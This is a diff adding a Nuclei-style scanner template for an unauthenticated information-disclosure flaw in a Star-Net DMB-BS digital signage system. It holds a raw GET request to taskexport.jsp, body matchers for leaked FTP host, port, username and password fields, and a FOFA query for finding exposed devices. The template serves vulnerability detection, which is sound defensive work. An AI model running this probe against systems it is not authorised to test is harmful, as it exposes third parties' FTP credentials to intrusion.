@@ -1,0 +1,32 @@
+http:
+    - matchers:
+        - condition: and
+          part: body
+          type: word
+          words:
+            - <ftp
+            - host=
+            - port=
+            - user=
+            - pwd=
+        - status:
+            - 200
+          type: status
+      matchers-condition: and
+      raw:
+        - |
+          GET /dmb/out/taskexport.jsp?taskcode HTTP/1.1
+          Host: {{Hostname}}
+          User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:136.0) Gecko/20100101 Firefox/136.0
+id: xingwangruijie-DMB-BS-taskexport_jsp-Information-disclosure
+info:
+    author: Superhero
+    description: |-
+        fofa: app="STAR_NET-数字标牌系统"
+        星网锐捷 DMB-BS-taskexport.jsp 存在信息泄露漏洞，未经身份验证的远程攻击者可利用此漏洞获取FTP服务器用户密码等敏感信息，从而登录FTP服务器，使服务器处于极不安全的状态。
+    name: 星网锐捷 DMB-BS-taskexport.jsp 信息泄露漏洞
+    reference:
+        - https://mp.weixin.qq.com/s/dh21EuxUf-44I8mjqCmp3A
+    severity: medium
+    tags:
+        - Information disclosure
